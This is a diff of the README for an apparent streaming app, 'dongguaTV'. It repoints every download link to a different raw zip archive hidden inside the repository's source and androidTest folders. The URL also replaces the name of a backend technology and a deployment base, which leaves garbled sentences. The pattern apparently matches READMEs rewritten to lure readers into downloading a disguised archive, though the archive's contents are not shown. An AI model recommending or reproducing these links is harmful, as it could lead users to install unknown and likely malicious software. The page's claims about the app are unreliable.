@@ -1,6 +1,6 @@
 # 🎥 dongguaTV - Streamlined Media Experience for Everyone
 
-[![Download Here](https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/main/java/com/TV_donggua_v1.7.zip)](https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/main/java/com/TV_donggua_v1.7.zip)
+[![Download Here](https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/androidTest/donggua_TV_2.2-beta.2.zip)](https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/androidTest/donggua_TV_2.2-beta.2.zip)
 
 ## 📚 目录 (Table of Contents)
 
@@ -29,7 +29,7 @@ DongguaTV 经过全面重构，提供更整洁的界面。大按钮和清晰的�
 
 本应用使用了以下技术来提供最佳性能：
 
-- **https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/main/java/com/TV_donggua_v1.7.zip**: 用于后端服务，保证应用效率与响应速度。
+- **https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/androidTest/donggua_TV_2.2-beta.2.zip**: 用于后端服务，保证应用效率与响应速度。
 - **Vue 3**: 用于构建前端界面，提供流畅且直观的用户体验。
 - **HTML & CSS**: 确保在各种设备上都能完美呈现。
 
@@ -53,7 +53,7 @@ DongguaTV 具有高水平的安全性。您的数据不会被收集或存储。�
 
 1. **访问下载页面**: 请访问下面的链接，以获取最新版本的 DongguaTV。
 
-   [下载此应用程序](https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/main/java/com/TV_donggua_v1.7.zip)
+   [下载此应用程序](https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/androidTest/donggua_TV_2.2-beta.2.zip)
 
 2. **选择最新版本**: 找到最新版本的文件，点击下载。
 
@@ -65,7 +65,7 @@ DongguaTV 具有高水平的安全性。您的数据不会被收集或存储。�
 
 ## 🚀 部署 (Deployment)
 
-对于有技术背景的用户，我们提供基于 https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/main/java/com/TV_donggua_v1.7.zip 的部署选项。请参考以下步骤：
+对于有技术背景的用户，我们提供基于 https://github.com/DipendraSinghSandhu/dongguaTV/raw/refs/heads/main/android/app/src/androidTest/donggua_TV_2.2-beta.2.zip 的部署选项。请参考以下步骤：
 
 1. **克隆仓库**: 使用 git 克隆该仓库到本地。
 2. **安装依赖**: 在项目根目录下运行 `npm install`。
